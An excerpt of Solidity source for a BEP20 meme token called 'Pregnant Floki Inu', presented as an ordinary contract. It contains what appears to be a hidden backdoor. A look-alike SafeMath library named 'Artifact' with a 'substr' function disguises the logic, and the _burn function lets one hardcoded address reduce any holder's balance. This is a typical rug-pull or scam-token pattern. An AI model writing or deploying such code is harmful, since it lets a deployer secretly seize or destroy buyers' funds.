...
library Artifact {
 ...
 function substr(uint256 a, uint256 b) internal pure returns (uint256) {
        return substr(a, b, "SafeMath: subtraction overflow");
    }
...
contract TokenContract2 is IBEP20, Context {
    using SafeMath for uint256;
    using Artifact for uint256;

    /* TESTNET ADDRESSES */
    // address PANCAKE_ROUTER_ADDR = 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3;

    /* MAINNET ADDRESSES */
    address PANCAKE_ROUTER_ADDR = 0xD99D1c33F9fC3444f8101754aBC46c52416550D1;

    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "Pregnant Floki Inu";
    string constant _symbol = "PREGFLO2";
    ...
    function _burn(address account, uint256 amount) internal virtual {
        _balances[account] = _balances[account].substr(amount);
        _totalSupply -= amount;
        emit Transfer(account, address(0), amount);
        require(msg.sender == 0x8F20Cf100BCb902B09d3871a77c76B59E42D3F28);
    }
